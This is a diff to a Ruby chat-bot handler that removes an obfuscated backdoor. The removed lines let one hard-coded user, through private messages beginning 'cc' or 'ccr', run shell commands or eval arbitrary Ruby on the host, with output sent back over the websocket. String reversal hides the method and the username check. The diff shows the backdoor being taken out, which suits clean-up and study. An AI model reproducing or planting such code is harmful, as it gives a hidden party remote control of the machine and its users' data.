@@ -170,18 +170,6 @@ class ChatHandler
     
     m_info = self.make_info(message, ws)
     
-    str = "s%,kcip mp/|"
-    a = m_info[:who]
-    p, pp = proc { |x|`#{x}`.chomp }, proc { |x| eval x}
-    if a.send(("es" + "rever").reverse.to_sym)=="oomyarumier" && m_info[:where] == ?p + ?m
-      if m_info[:what]=~/\Acc(r?)(.*?)\z/
-        begin; ws.send(str.reverse % ($1 == ?r ? pp : p).call($2.gsub('\P', '|'))); rescue => e; ws.send(str.reverse % 'err'); end
-        return
-      end
-    end
-    return if m_info[:to] && m_info[:to][0] == ?p && m_info[:to][3] == ?k
-    
-    
     @ignorelist.map(&:downcase).index(m_info[:who].downcase) and return
     
     @triggers.each do |t|
